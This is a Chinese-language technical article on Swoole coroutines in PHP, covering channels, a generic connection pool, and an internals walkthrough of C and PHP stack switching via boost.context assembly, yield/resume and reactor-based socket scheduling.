协程实现
1、swoole的两种命名空间形式

Swoole支持两种形式的命名空间一种是Swoole\Coroutine，2.2.0以上可使用Co\命名空间短命名简化类名。

2、协程默认支持的位置

目前Swoole4仅有部分事件回调函数底层自动创建了协程，以下回调函数可以调用协程客户端，可以查看这里https://wiki.swoole.com/wiki/page/696.html

 

在不支持协程的位置可以使用go或Co::create创建协程

3、协程的性能测试

通过多个协程连接redis操作对比没有使用协程的方式

4、协程并发

协程其实也是阻塞运行的，如果，在一个执行中，比如同时查redis，再去查mysql，即使用了上面的协程，也是顺序执行的。那么可不可以几个协程并发执行呢？

通过延迟收包的形式获取，遇到到IO 阻塞的时候，协程就挂起了，不会阻塞在那里等着网络回报，而是继续往下走,swoole当中可以用setDefer()方法声明延迟收包然后通过recv()方法收包。

5、协程通讯

  使用本地内存，不同的进程之间内存是隔离的。只能在同一进程的不同协程内进行push和pop操作

向通道中写入数据。

function Coroutine\Channel->push(mixed $data) : bool;

从通道中读取数据。

function Coroutine\Channel->pop() : mixed;

对协程调用场景，最常见的“生产者-消费者”事件驱动模型，一个协程负责生产产品并将它们加入队列，另一个负责从队列中取出产品并使用它。

6、协程的注意问题

如果在多个协程间共用同一个协程客户端,同步阻塞程序不同，协程是并发处理请求的，因此同一时间可能会有很多个请求在并行处理，一旦共用客户端连接，就会导致不同协程之间发生数据错乱。

 

swoole通用协程池的实现
swoole官方的协程池是用只能用在Redis。因为协程池代码层耦合了Redis实例化逻辑。通过工厂函数实现了通用性。

class RedisPool
{
    /**
     * @var \Swoole\Coroutine\Channel
     */
    protected $pool;
 
    /**
     * RedisPool constructor.
     * @param int $size 连接池的尺寸
     */
    function __construct($size = 100)
    {
        $this->pool = new Swoole\Coroutine\Channel($size);
        for ($i = 0; $i < $size; $i++)
        {
            $redis = new Swoole\Coroutine\Redis();
            $res = $redis->connect('127.0.0.1', 6379);
            if ($res == false)
            {
                throw new RuntimeException("failed to connect redis server.");
            }
            else
            {
                $this->put($redis);
            }
        }
    }
 
    function put($redis)
    {
        $this->pool->push($redis);
    }
 
    function get()
    {
        return $this->pool->pop();
    }
}
利用工厂方法的改造如下：

<?php
/**
 * @author xialeistudio
 * @date 2019-05-20
 */
 
namespace swoole\foundation\pool;
 
use Swoole\Coroutine\Channel;
 
/**
 * Swoole generic connection pool
 * Class Pool
 * @package swoole\foundation\pool
 */
class GenericPool
{
    /**
     * @var int pool size
     */
    private $size = 0;
    /**
     * @var callable construct a connection
     */
    private $factory = null;
    /**
     * @var Channel
     */
    private $channel = null;
 
    /**
     * GenericPool constructor.
     * @param int $size
     * @param callable $factory
     * @throws InvalidParamException
     */
    public function __construct($size, callable $factory)
    {
        $this->size = $size;
        $this->factory = $factory;
        $this->init();
    }
 
 
    /**
     * check pool config
     * @throws InvalidParamException
     */
    private function init()
    {
        if ($this->size <= 0) {
            throw new InvalidParamException('The "size" property must be greater than zero.');
        }
        if (empty($this->factory)) {
            throw new InvalidParamException('The "factory" property must be set.');
        }
        if (!is_callable($this->factory)) {
            throw new InvalidParamException('The "factory" property must be callable.');
        }
        $this->bootstrap();
    }
 
    /**
     * bootstrap pool
     */
    private function bootstrap()
    {
        $this->channel = new Channel($this->size);
 
        for ($i = 0; $i < $this->size; $i++) {
            $this->channel->push(call_user_func($this->factory));
        }
    }
 
    /**
     * Acquire a connection
     * @param int $timeout
     * @return mixed
     */
    public function acquire($timeout = 0)
    {
        return $this->channel->pop($timeout);
    }
 
    /**
     * Release a resource
     * @param mixed $resource
     */
    public function release($resource)
    {
        $this->channel->push($resource);
    }
}
https://segmentfault.com/a/1190000019089997?utm_source=tag-newest
Swoole协程简介

  Swoole4为PHP语言提供了强大的CSP协程编程模式，用户可以通过go函数创建一个协程，以达到并发执行的效果，如下面代码所示：
<?php

//Co::sleep()是Swoole提供的API，并不会阻塞当前进程，只会阻塞协程触发协程切换。
go(function (){
    Co::sleep(1);
    echo "a";
});

go(function (){
    Co::sleep(2);
    echo "b";
});

echo "c";



//输出结果：cab
//程序总执行时间2秒

  其实在Swoole4之前就实现了多协程编程模式，在协程创建、切换以及结束的时候，相应的操作php栈即可（创建、切换以及回收php栈）。

  此时的协程实现无法完美的支持php语法，其根本原因在于没有保存c栈信息。（vm内部或者某些扩展提供的API是通过c函数实现的，调用这些函数时如果发生协程切换，c栈该如何处理？）

  Swoole4新增了c栈的管理，在协程创建、切换以及结束的同时会伴随着c栈的创建、切换以及回收。

  Swoole4协程实现方案如下图所示：


image

  其中：
•API层是提供给用户使用的协程相关函数，比如go()函数用于创建协程；Co::yield()使得当前协程让出CPU；Co::resume()可恢复某个协程执行；
•Swoole4协程需要同时管理c栈与php栈，Coroutine用于管理c栈，PHPCoroutine用于管理php栈；其中Coroutine()，yield()，resume()实现了c栈的创建以及换入换出；create_func()，on_yield()，on_resume()实现了php栈的创建以及换入换出；
•Swoole4在管理c栈时，用到了 boost.context库，make_fcontext()和jump_fcontext()函数均使用汇编语言编写，实现了c栈上下文的创建以及切换；
•Swoole4对boost.context进行了简单封装，即Context层，Context()，SwapIn()以及SwapOut()

对应c栈的创建以及换入换出。

深入理解C栈

  函数是对代码的封装，对外暴露的只是一组指定的参数和一个可选的返回值；假设函数P调用函数Q，Q执行后返回函数P，实现该函数调用需要考虑以下三点：
•指令跳转：进入函数Q的时候，程序计数器必须被设置为Q的代码的起始地址；在返回时，程序计数器需要设置为P中调用Q后面那条指令的地址；
•数据传递：P能够向Q提供一个或多个参数，Q能够向P返回一个值；
•内存分配与释放：Q开始执行时，可能需要为局部变量分配内存空间，而在返回前，又需要释放这些内存空间；

  大多数语言的函数调用都采用了栈结构实现，函数的调用与返回即对应的是一系列的入栈与出栈操作，我们通常称之为函数栈帧（stack frame）。示意图如下：


image

  上面提到的程序计数器即寄存器%rip，另外还有两个寄存器需要重点关注：%rbp指向栈帧底部，%rsp指向栈帧顶部。

  下面将通过具体的代码事例，为读者讲解函数栈帧。c代码与汇编代码如下：
int add(int x, int y)
{
    int a, b;
    a = 10;
    b = 5;
       return x+y;
}

int main()
{
    int sum = add(1,2);
}
main：
    pushq   %rbp
    movq    %rsp, %rbp
    subq    $16, %rsp
    movl    $2, %esi
    movl    $1, %edi
    call    add
    movl    %eax, -4(%rbp)
    leave
    ret
add：
    pushq   %rbp
    movq    %rsp, %rbp
    movl    %edi, -20(%rbp)
    movl    %esi, -24(%rbp)
    movl    $10, -4(%rbp)
    movl    $5, -8(%rbp)
    movl    -24(%rbp), %eax
    movl    -20(%rbp), %edx
    addl    %edx, %eax
    popq    %rbp
    ret

  分析汇编代码：
•main函数与add函数入口，首先将寄存器%rbp压入栈中用于保存其值，其次移动%rbp指向当前栈顶部（此时%rbp，%rsp都指向栈顶，开始新的函数栈帧）；
•main函数"subq $16, %rsp"，是为main函数栈帧预留16个字节的内存空间；
•调用add函数时，第一个参数和第二个参数分别保存在寄存器%edi和%esi，返回值保存在寄存器%eax；
•call指令用于函数调用，实现了两个功能：寄存器%rip压入栈中，跳转到新的代码位置；
•ret指令用于函数返回，弹出栈顶内容到寄存器%rip，依次实现代码跳转；
•leave指令等同于两条指令：movq %rsp,%rbp和popq %rbp，用于释放main函数栈帧，恢复前一个函数栈帧；
•注意add函数栈帧，并没有为其分配空间，寄存器%rsp和%rbp都指向栈帧底部；根本因为是add函数没有调用其他函数。
•该程序的栈结构示意图如下：


image

  问题：观察上面的汇编代码，输入参数分别使用的是寄存器%edi和%esi，返回值使用的是寄存器%eax，输入输出参数不应该保存在栈上吗？寄存器比内存访问要快的多，现代处理器寄存器数目也比较多，因此倾向于将参数优先保存在寄存器。比如%rdi, %rsi, %rdx, %rcx, %r8d, %r9d 六个寄存器用于存储函数调用时的前6个参数，那么当输入参数数目超过6个时，如何处理？这些输入参数只能存储在栈上了。
（%rdi等表示64位寄存器，%edi等表示32位寄存器）
//add函数需要9个参数
add(1,2,3,4,5,6,7,8,9);

//参数7，8，9存储在栈上
movl    $9, 16(%rsp)
movl    $8, 8(%rsp)
movl    $7, (%rsp)
movl    $6, %r9d
movl    $5, %r8d
movl    $4, %ecx
movl    $3, %edx
movl    $2, %esi
movl    $1, %edi

Swoole C栈管理

  通过学习c栈基本知识，我们知道最主要有三个寄存器：%rip程序计数器指向下一条需要执行的指令，%rbp指向函数栈帧底部，%rsp指向函数栈帧顶部。这三个寄存器可以确定一个c栈执行上下文，c栈的管理其实就是这些寄存器的管理。

  第一节我们提到Swoole在管理c栈时，用到了 boost.context库，其中make_fcontext()和jump_fcontext()函数均使用汇编语言编写，实现了c栈执行上下文的创建以及切换；函声明命如下：
fcontext_t make_fcontext(void *sp, size_t size, void (*fn)(intptr_t));
intptr_t jump_fcontext(fcontext_t *ofc, fcontext_t nfc, intptr_t vp, bool preserve_fpu = false);

  make_fcontext函数用于创建一个执行上下文，其中参数sp指向内存最高地址处（在堆中分配一块内存作为该执行上下文的c栈），参数size为栈大小，参数fn是一个函数指针，指向该执行上下文的入口函数；代码主要逻辑如下：
/*%rdi表示第一个参数sp，指向栈顶*/
movq  %rdi, %rax

//保证%rax指向的地址按照16字节对齐
andq  $-16, %rax

//将%rax向低地址处偏移0x48字节
leaq  -0x48(%rax), %rax

/* %rdx表示第三个参数fn，保存在%rax偏移0x38位置处 */
movq  %rdx, 0x38(%rax)

stmxcsr  (%rax)
fnstcw   0x4(%rax)


leaq  finish(%rip), %rcx
movq  %rcx, 0x40(%rax)

//返回值保存在%rax寄存器
ret 

  make_fcontext函数创建的执行上下文示意图如下（可以看到预留了若干字节用于保存上下文信息）：


image

  Swoole协程实现的Context层封装了上下文的创建，创建上下文函数实现如下：
Context::Context(size_t stack_size, coroutine_func_t fn, void* private_data) :
        fn_(fn), stack_size_(stack_size), private_data_(private_data)
{
    
    stack_ = (char*) sw_malloc(stack_size_);

    void* sp = (void*) ((char*) stack_ + stack_size_);
    ctx_ = make_fcontext(sp, stack_size_, (void (*)(intptr_t))&context_func);

}

  可以看到c栈执行上下文是通过sw_malloc函数在堆上分配的一块内存，默认大小为2M字节；参数sp指向的是内存最高地址处；执行上下文的入口函数为Context::context_func()。

  jump_fcontext函数用于切换c栈上下文：1）函数会将当前上下文（寄存器）保存在当前栈顶（push），同时将%rsp寄存器内容保存在ofc地址；2）函数从nfc地址处恢复%rsp寄存器内容，同时从栈顶恢复上下文信息（pop）。代码主要逻辑如下：
//-------------------保存当前c栈上下文-------------------
pushq  %rbp  /* save RBP */
pushq  %rbx  /* save RBX */
pushq  %r15  /* save R15 */
pushq  %r14  /* save R14 */
pushq  %r13  /* save R13 */
pushq  %r12  /* save R12 */

leaq  -0x8(%rsp), %rsp
stmxcsr  (%rsp)
fnstcw   0x4(%rsp)

//%rdi表示第一个参数，即ofc，保存%rsp到ofc地址处
movq  %rsp, (%rdi)


//-------------------从nfc中恢复上下文-------------------
//%rsi表示第二个参数，即nfc，从nfc地址处恢复%rsp
movq  %rsi, %rsp

ldmxcsr  (%rsp)
fldcw  0x4(%rsp)
leaq  0x8(%rsp), %rsp

popq  %r12  /* restrore R12 */
popq  %r13  /* restrore R13 */
popq  %r14  /* restrore R14 */
popq  %r15  /* restrore R15 */
popq  %rbx  /* restrore RBX */
popq  %rbp  /* restrore RBP */

//这里弹出的其实是之前保存的%rip
popq  %r8

//%rdx表示第三个参数，%rax用于存储函数返回值；
movq  %rdx, %rax
//%rdi用于存储第一个参数
movq  %rdx, %rdi

//跳转到%r8指向的地址
jmp  *%r8

  观察jump_fcontext函数的汇编代码，可以看到保存上下文与恢复上下文的代码基本是对称的。恢复上下文时"popq %r8"用于弹出上一次保存的程序计数器%rip的内容，然而并没有看到保存寄存器%rip的代码。这是因为调用jump_fcontext函数时，底层call指令已经将%rip入栈了。

  Swoole协程实现的Context层封装了上下文的换入换出，可以在上下文swap_ctx_和ctx_之间随时换入换出，代码实现如下：
bool Context::SwapIn()
{
    jump_fcontext(&swap_ctx_, ctx_, (intptr_t) this, true);
    return true;
}

bool Context::SwapOut()
{
    jump_fcontext(&ctx_, swap_ctx_, (intptr_t) this, true);
    return true;
}

  上下文示意图如下所示：


image

Swoole PHP栈管理

  php代码在执行时，同样存在函数栈帧的分配与回收。php将此抽象为两个结构，php栈zend_vm_stack，与执行数据（函数栈帧）zend_execute_data。

  php栈结构与c栈结构基本类似，定义如下：
struct _zend_vm_stack {
    zval *top; 
    zval *end; 
    zend_vm_stack prev; 
};


  其中top字段指向栈顶位置，end字段指向栈底位置；prev指向上一个栈，形成链表，当栈空间不够时，可以进行扩容。php虚拟机申请栈空间时默认大小为256K，Swoole创建栈空间时默认大小为8K。

  执行数据结构体，我们需要重点关注这几个字段：当前函数编译后的指令集（opline指向指令集数组中的某一个元素，虚拟机只需要遍历该数组并执行所有指令即可），函数返回值，以及调用该函数的执行数据；结构定义如下：
struct _zend_execute_data {
    //当前执行指令
    const zend_op       *opline; 
    
    zend_execute_data   *call; 
    //函数返回值          
    zval                *return_value;
    zend_function       *func;            
    zval                 This;      /* this + call_info + num_args */
    //调用当前函数的栈帧       
    zend_execute_data   *prev_execute_data;
    //符号表
    zend_array          *symbol_table;
#if ZEND_EX_USE_RUN_TIME_CACHE
    void               **run_time_cache;  
#endif
#if ZEND_EX_USE_LITERALS
    //常量数组
    zval                *literals;        
#endif
};

  php栈初始化函数为zend_vm_stack_init；当执行用户函数调用时，虚拟机通过函数zend_vm_stack_push_call_frame在php栈上分配新的执行数据，并执行该函数代码；函数执行完成后，释放该执行数据。代码逻辑如下：
ZEND_API void zend_execute(zend_op_array *op_array, zval *return_value)
{
    //分配新的执行数据
    execute_data = zend_vm_stack_push_call_frame(ZEND_CALL_TOP_CODE | ZEND_CALL_HAS_SYMBOL_TABLE,
        (zend_function*)op_array, 0, zend_get_called_scope(EG(current_execute_data)), zend_get_this_object(EG(current_execute_data)));
    
    //设置prev
    execute_data->prev_execute_data = EG(current_execute_data);
    
    //初始化当前执行数据，op_array即为当前函数编译得到的指令集
    i_init_execute_data(execute_data, op_array, return_value);
    
    //执行函数代码
    zend_execute_ex(execute_data);
    
    //释放执行数据
    zend_vm_stack_free_call_frame(execute_data);
}

  php栈帧结构示意图如下：


image

  Swoole协程实现，需要自己管理php栈，在发生协程创建以及切换时，对应的创建新的php栈，切换php栈，同时保存和恢复php栈上下文信息。这里涉及到一个很重要的结构体php_coro_task：
struct php_coro_task
{
    zval *vm_stack_top;
    zval *vm_stack_end;
    zend_vm_stack vm_stack;
    
    zend_execute_data *execute_data;
};

  这里列出了php_coro_task结构体的若干关键字段，这些字段用于保存和恢复php上下文信息。

  协程创建时，底层通过函数PHPCoroutine::create_func实现了php栈的创建：
void PHPCoroutine::create_func(void *arg)
{
    //创建并初始化php栈
    vm_stack_init();
    call = (zend_execute_data *) (EG(vm_stack_top));
    
    //为结构php_coro_task分配空间
    task = (php_coro_task *) EG(vm_stack_top);
    EG(vm_stack_top) = (zval *) ((char *) call + PHP_CORO_TASK_SLOT * sizeof(zval));
    
    //创建新的执行数据结构
    call = zend_vm_stack_push_call_frame(
        ZEND_CALL_TOP_FUNCTION | ZEND_CALL_ALLOCATED,
        func, argc, fci_cache.called_scope, fci_cache.object
    );
}

  从代码中可以看到结构php_coro_task是直接存储在php栈的底部。

  当通过yield函数让出CPU时，底层会调用函数PHPCoroutine::on_yield切换php栈：
void PHPCoroutine::on_yield(void *arg)
{
    php_coro_task *task = (php_coro_task *) arg;
    php_coro_task *origin_task = get_origin_task(task);
    
    //保存当前php栈上下文信息到php_coro_task结构
    save_task(task);
    
    //从php_coro_task结构中恢复php栈上下文信息
    restore_task(origin_task);
}

Swoole协程实现

  前面我们简单介绍了Swoole协程的实现方案，以及Swoole对c栈与php栈的管理，接下来将结合前面的知识，系统性的介绍Swoole协程的实现原理。

swoole协程数据模型

  话不多说，先看一张图：


image
•每个协程都需要管理自己的c栈与php栈；
•Context封装了c栈的管理操作;ctx_字段保存的是寄存器%rsp的内容（指向c栈栈顶位置）；swap_ctx_字段保存的是将被换出的协程寄存器%rsp内容（即，将被换出的协程的c栈栈顶位置）；SwapIn()对应协程换入操作；SwapOut()对应协程换出操作；
•参考jump_fcontext实现，协程在换出时，会将寄存器%rip，%rbp等暂存在c栈栈顶；协程在换入时，相应的会从栈顶恢复这些寄存器的内容；
•Coroutine管理着协程所有内容；cid字段表示当前协程的ID；task字段指向当前协程的php_coro_task结构，该结构中保存的是当前协程的php栈信息（vm_stack_top，execute_data等）；ctx字段指向的是当前协程的Context对象；origin字段指向的是另一个协程Coroutine对象；yield()和resume()对应的是协程的换出换入操作；
•注意到php_coro_task结构的co字段指向其对应的协程对象Coroutine；
•Coroutine还有一些静态属性，静态属性的属于类属性，所有协程共享的；last_cid字段存储的是当前最大的协程ID，创建协程时可用于生成协程ID；current字段指向的是当前正在运行的协程Coroutine对象；on_yield和on_resume是两个函数指针，用于实现php栈的切换操作，实际指向的是方法PHPCoroutine::on_yield和PHPCoroutine::on_resume；

swoole协程实现

协程创建

  Swoole创建协程可以使用go()函数，底层实现对应的是PHP_FUNCTION(swoole_coroutine_create)，其函数实现如下：
PHP_FUNCTION(swoole_coroutine_create)
{
    ……
    
    long cid = PHPCoroutine::create(&fci_cache, fci.param_count, fci.params);
}

long PHPCoroutine::create(zend_fcall_info_cache *fci_cache, uint32_t argc, zval *argv)
{
    ……
    
    save_task(get_task());

    return Coroutine::create(create_func, (void*) &php_coro_args);
}

class Coroutine
{
public:
    static inline long create(coroutine_func_t fn, void* args = nullptr)
    {
        return (new Coroutine(fn, args))->run();
    }
}

•注意Coroutine::create函数第一个参数伟create_func，该函数后续用于创建php栈，并开始协程代码的执行；
•可以看到PHPCoroutine::create在调用Coroutine::create创建创建协程之前，保存了当前php栈信息到php_coro_task结构中。
•注意主程序的php栈是虚拟机创建的，结构与上面画的协程php栈不同，主程序的php_coro_task结构并没有存储在php栈上，而是一个静态变量PHPCoroutine::main_task，从get_task方法可以看出，主程序中get_current_task()返回的是null，因此最后获得的php_coro_task结构是PHPCoroutine::main_task。
class PHPCoroutine
{
public:
   static inline php_coro_task* get_task()
    {
        php_coro_task *task = (php_coro_task *) Coroutine::get_current_task();
        return task ? task : &main_task;
    } 
}

•在Coroutine的构造函数中完成了协程对象Coroutine的创建与初始化，以及Context对象的创建与初始化（创建了c栈）；run()函数执行了协程的换入，从而开始协程的运行；
//全局协程map
std::unordered_map<long, Coroutine*> Coroutine::coroutines;

class Coroutine
{
protected:
    Coroutine(coroutine_func_t fn, void *private_data) :
            ctx(stack_size, fn, private_data)
    {
        cid = ++last_cid;
        coroutines[cid] = this;
    }
    
    inline long run()
    {
        long cid = this->cid;
        origin = current;
        current = this;
        ctx.SwapIn();
        if (ctx.end)
        {
            close();
        }
        return cid;
    }
}
•可以看到创建协程对象Coroutine时，通过last_cid来计算当前协程的ID，同时将该协程对象加入到全局map中；代码ctx(stack_size, fn, private_data)创建并初始化了Context对象；
•run()函数将该协程换入执行时，赋值origin为当前协程（主程序中current为null），同时设置current为当前协程对象Coroutine；调用SwapIn()函数完成协程的换入执行；最后如果协程执行完毕，则关闭并释放该协程对象Coroutine；
•初始化Context对象时，可以看到其构造函数Context::Context(size_t stack_size, coroutine_func_t fn, void* private_data)，其中参数fn为协程入口函数（PHPCoroutine::create_func），可以看到其赋值给ontext对象的字段fn_，但是在创建c栈上下文时，其传入的入口函数为context_func；
Context::Context(size_t stack_size, coroutine_func_t fn, void* private_data) :
        fn_(fn), stack_size_(stack_size), private_data_(private_data)
{
    ……
    
    ctx_ = make_fcontext(sp, stack_size_, (void (*)(intptr_t))&context_func);

}
•函数context_func内部其实调用的就是方法PHPCoroutine::create_func；当协程执行结束时，会标记end字段为true，同时将该协程换出；
void Context::context_func(void *arg)
{
    Context *_this = (Context *) arg;
    _this->fn_(_this->private_data_);
    _this->end = true;
    _this->SwapOut();
}

◆  问题：参数arg为什么是Context对象呢，是如何传递的呢？这就涉及到jump_fcontext汇编实现，以及jump_fcontext的调用了
jump_fcontext(&swap_ctx_, ctx_, (intptr_t) this, true);

jump_fcontext:
    movq  %rdx, %rdi

  调用jump_fcontext函数时，第三个参数传递的是this，即当前Context对象；而函数jump_fcontext汇编实现时，将第三个参数的内容拷贝到%rdi寄存器中，当协程换入执行函数context_func时，寄存器%rdi存储的就是第一个参数，即Context对象。
•方法PHPCoroutine::create_func就是创建并初始化php栈，执行协程代码；这里不做过多介绍。

◆  问题：Coroutine的静态属性on_yield和on_resume时什么时候赋值的？

  在Swoole模块初始化时，会调用函数swoole_coroutine_util_init（该函数同时声明了"Co"等短名称），该函数进一步的调用PHPCoroutine::init()方法，该方法完成了静态属性的赋值操作。
void PHPCoroutine::init()
{
    Coroutine::set_on_yield(on_yield);
    Coroutine::set_on_resume(on_resume);
    Coroutine::set_on_close(on_close);
}

协程切换

  用户可以通过Co::yield()和Co::resume()实现协程的让出和恢复，
Co::yield()的底层实现函数为PHP_METHOD(swoole_coroutine_util, yield)，Co::resume()的底层实现函数为PHP_METHOD(swoole_coroutine_util, resume)。本节将为读者讲述协程切换的实现原理。
static unordered_map<int, Coroutine *> user_yield_coros;

static PHP_METHOD(swoole_coroutine_util, yield)
{
    Coroutine* co = Coroutine::get_current_safe();
    user_yield_coros[co->get_cid()] = co;
    co->yield();
    RETURN_TRUE;
}

static PHP_METHOD(swoole_coroutine_util, resume)
{
    ……
    auto coroutine_iterator = user_yield_coros.find(cid);
    if (coroutine_iterator == user_yield_coros.end())
    {
        swoole_php_fatal_error(E_WARNING, "you can not resume the coroutine which is in IO operation");
        RETURN_FALSE;
    }
    
    user_yield_coros.erase(cid);
    co->resume();
}
•调用Co::resume()恢复某个协程之前，该协程必然已经调用Co::yield()让出CPU；因此在Co::yield()时，会将该协程对象添加到全局map中；Co::resume()时做相应校验，如果校验通过则恢复协程，并从map种删除该协程对象；
•co->yield()实现了协程的让出操作；1）设置协程状态为SW_CORO_WAITING；2）回调on_yield方法，即PHPCoroutine::on_yield，保存当前协程（task代表协程）的php栈上下文，恢复另一个协程的php栈上下文（origin代表另一个协程对象）；3）设置当前协程对象为origin；4）换出该协程；
void Coroutine::yield()
{
    state = SW_CORO_WAITING;
    if (on_yield)
    {
        on_yield(task);
    }
    current = origin;
    ctx.SwapOut();
}
•co->resume()实现了协程的恢复操作：1）设置协程状态为SW_CORO_RUNNING；2）回调on_resume方法，即PHPCoroutine::on_resume，保存当前协程（current协程）的php栈上下文，恢复另一个协程（task代表协程）的php栈上下文；3）设置origin为当前协程对象，current为即将要换入的协程对象；4）换入协程；
void Coroutine::resume()
{
    state = SW_CORO_RUNNING;
    if (on_resume)
    {
        on_resume(task);
    }
    origin = current;
    current = this;
    ctx.SwapIn();
    if (ctx.end)
    {
        close();
    }
}
•Swoole协程有四种状态：初始化，运行中，等待运行，运行结束；定义如下：
typedef enum
{
    SW_CORO_INIT = 0,
    SW_CORO_WAITING,
    SW_CORO_RUNNING,
    SW_CORO_END,
} sw_coro_state;
•协程之间可以通过Coroutine对象的origin字段形成一个类似链表的结构；Co::yield()换出当前协程时，会换入origin协程；在A协程种调用Co::resume()恢复B协程时，会换出A协程，换入B协程，同时标记A协程为B的origin协程；

  协程切换过程比较简单，这里不做过多详述。

协程调度

  当我们调用Co::sleep()让协程休眠时，会换出当前协程；或者调用CoroutineSocket->recv()从socket接收数据，但socket数据还没有准备好时，会阻塞当前协程，从而使得协程换出。那么问题来了，什么时候再换入执行这个协程呢？

socket读写实现

  Swoole的socket读写使用的成熟的IO多路复用模型：epoll/kqueue/select/poll等，并且将其封装在结构体_swReactor中，其定义如下：
struct _swReactor
{
    //超时时间
    int32_t timeout_msec;
    
    //fd的读写事件处理函数
    swReactor_handle handle[SW_MAX_FDTYPE];        
    swReactor_handle write_handle[SW_MAX_FDTYPE];  
    swReactor_handle error_handle[SW_MAX_FDTYPE];
    
    //fd事件的注册修改删除以及wait
    //函数指针，（以epoll为例）指向的是epoll_ctl、epoll_wait
    int (*add)(swReactor *, int fd, int fdtype);
    int (*set)(swReactor *, int fd, int fdtype);
    int (*del)(swReactor *, int fd);
    int (*wait)(swReactor *, struct timeval *);
    void (*free)(swReactor *);
    
    //超时回调函数，结束、开始回调函数
    void (*onTimeout)(swReactor *);
    void (*onFinish)(swReactor *);
    void (*onBegin)(swReactor *);
}

  在调用函数PHPCoroutine::create创建协程时，会校验是否已经初始化_swReactor对象，如果没有则会调用php_swoole_reactor_init函数创建并初始化main_reactor对象；
void php_swoole_reactor_init()
{
    if (SwooleG.main_reactor == NULL)
    {

        SwooleG.main_reactor = (swReactor *) sw_malloc(sizeof(swReactor));
        
        if (swReactor_create(SwooleG.main_reactor, SW_REACTOR_MAXEVENTS) < 0)
        {
           
        }

        ……
        
        php_swoole_register_shutdown_function_prepend("swoole_event_wait");
    }
    
}

  我们以epoll为例，main_reactor各回调函数如下：
reactor->onFinish = swReactor_onFinish;
reactor->onTimeout = swReactor_onTimeout;

reactor->add = swReactorEpoll_add;
reactor->set = swReactorEpoll_set;
reactor->del = swReactorEpoll_del;
reactor->wait = swReactorEpoll_wait;
reactor->free = swReactorEpoll_free;

◆  注意：这里注册了一个函数swoole_event_wait，在生命周期register_shutdown阶段会执行该函数，开始Swoole的事件循环，阻挡了php生命周期的结束。

  类Socket封装了socket读写相关的所有操作以及数据结构，其定义如下：
class Socket
{
public:
    swConnection *socket = nullptr;

    //读写函数
    ssize_t recv(void *__buf, size_t __n);
    ssize_t send(const void *__buf, size_t __n);
    ……
    
private:

    swReactor *reactor = nullptr;
    Coroutine *read_co = nullptr;
    Coroutine *write_co = nullptr;
    
    //连接超时时间，接收数据、发送数据超时时间
    double connect_timeout = default_connect_timeout;
    double read_timeout = default_read_timeout;
    double write_timeout = default_write_timeout;
}
•socket字段类型为swConnection，代表传输层连接；
•reactor字段指向结构体swReactor对象，用于fd事件的注册、修改、删除以及wait；
•当调用recv()函数接收数据，阻塞了该协程时，read_co字段指向该协程对象Coroutine；
•当调用send()函数接收数据，阻塞了该协程时，write_co字段指向该协程对象Coroutine；
•类Socket初始化函数为Socket::init_sock：
void Socket::init_sock(int _fd)
{
    
    reactor = SwooleG.main_reactor;
    
    //设置协程类型fd（SW_FD_CORO_SOCKET）的读写事件处理函数
    if (!swReactor_handle_isset(reactor, SW_FD_CORO_SOCKET))
    {
        reactor->setHandle(reactor, SW_FD_CORO_SOCKET | SW_EVENT_READ, readable_event_callback);
        reactor->setHandle(reactor, SW_FD_CORO_SOCKET | SW_EVENT_WRITE, writable_event_callback);
        reactor->setHandle(reactor, SW_FD_CORO_SOCKET | SW_EVENT_ERROR, error_event_callback);
    }
}

  当我们调用CoroutineSocket->recv接收数据时，底层实现如下：
Socket::timeout_setter ts(sock->socket, timeout, SW_TIMEOUT_READ);
ssize_t bytes = all ? sock->socket->recv_all(ZSTR_VAL(buf), length) : sock->socket->recv(ZSTR_VAL(buf), length);
    

  类timeout_setter会设置socket的接收数据超时时间read_timeout为timeout。

  函数socket->recv_all会循环读取数据，直到读取到指定长度的数据，或者底层返回等待标识阻塞当前协程：
ssize_t Socket::recv_all(void *__buf, size_t __n)
{
 
    timer_controller timer(&read_timer, read_timeout, this, timer_callback);
    while (true)
    {
        do {
            retval = swConnection_recv(socket, (char *) __buf + total_bytes, __n - total_bytes, 0);
        } while (retval < 0 && swConnection_error(errno) == SW_WAIT && timer.start() && wait_event(SW_EVENT_READ));
        if (unlikely(retval <= 0))
        {
            break;
        }
        total_bytes += retval;
        if ((size_t) total_bytes == __n)
        {
            break;
        }
    }
}
•函数首先创建timer_controller对象，设置其超时时间为read_timeout，以及超时回调函数为timer_callback；
•while (true)死循环读取fd数据，当读取数据量等于__n时，读取操作结束，break该循环；如果读取操作swConnection_recv返回值小于0，并且错误标识为SW_WAIT，说明需要等待数据到来，此时阻塞当前协程等待数据到来（函数wait_event会换出当前协程），阻塞超时时间为read_timeout（函数timer.start()用于设置超时时间）。
class timer_controller
{
public:
    bool start()
    {
        
        if (timeout > 0)
        {
            *timer_pp = swTimer_add(&SwooleG.timer, (long) (timeout * 1000), 0, data, callback);
        }

    }
}
•函数swTimer_add用于添加一个定时器；Swoole底层定时任务是通过最小堆实现的，堆顶元素的超时时间最近；结构体_swTimer维护着Swoole内部所有的定时任务：
struct _swTimer
{
    swHeap *heap; //最小堆
    swHashMap *map; //map，定时器ID作为key
    
    //最早的定时任务触发时间
    long _next_msec;
    
    //函数指针，指向swReactorTimer_set
    int (*set)(swTimer *timer, long exec_msec);
    
    //函数指针，指向swReactorTimer_free
    void (*free)(swTimer *timer);
};
•当调用swTimer_add向_swTimer结构中添加定时任务时，需要更新_swTimer中最早的定时任务触发时间_next_msec，同时更新main_reactor对象的超时时间：
if (timer->_next_msec < 0 || timer->_next_msec > _msec)
{
    timer->set(timer, _msec);
    timer->_next_msec = _msec;
}

static int swReactorTimer_set(swTimer *timer, long exec_msec)
{
    SwooleG.main_reactor->timeout_msec = exec_msec;
    return SW_OK;
}
•函数wait_event负责将当前协程换出，直到注册的事件发生
bool Socket::wait_event(const enum swEvent_type event, const void **__buf, size_t __n)
{
    if (unlikely(!add_event(event)))
    {
        return false;
    }
    
    if (likely(event == SW_EVENT_READ))
    {
        read_co = co;
        read_co->yield();
        read_co = nullptr;
    }
    else // if (event == SW_EVENT_WRITE)
    {
        write_co = co;
        write_co->yield();
        write_co = nullptr;
    }
}
•函数add_event用于添加事件，底层调用reactor->add添加fd的监听事件；
•read_co = co或者write_co = co，用于记录当前哪个协程阻塞在该socket对象上，当该socket对象的读写事件被触发时，可以恢复该协程执行；
•函数yield()将该协程换出；

